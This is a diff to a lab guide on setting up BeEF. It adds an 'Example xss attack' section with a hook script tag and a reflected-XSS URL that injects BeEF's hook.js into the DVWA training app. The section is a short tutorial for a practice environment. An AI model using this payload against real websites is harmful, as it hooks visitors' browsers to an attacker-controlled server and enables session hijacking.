@@ -37,3 +37,17 @@ http://10.0.2.15:3000/hook.js
 6. Login user and password.
 7. Login Successed
 # Done install BeEF
+### Example xss attack
+hook address
+```bash
+http://10.0.2.15:3000/hook.js
+```
+script
+```bash
+<script src=" http://10.0.2.15:3000/hook.js"></script>
+```
+full url
+```bash
+http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script src=" http://10.0.2.15:3000/hook.js"></script>
+```
+
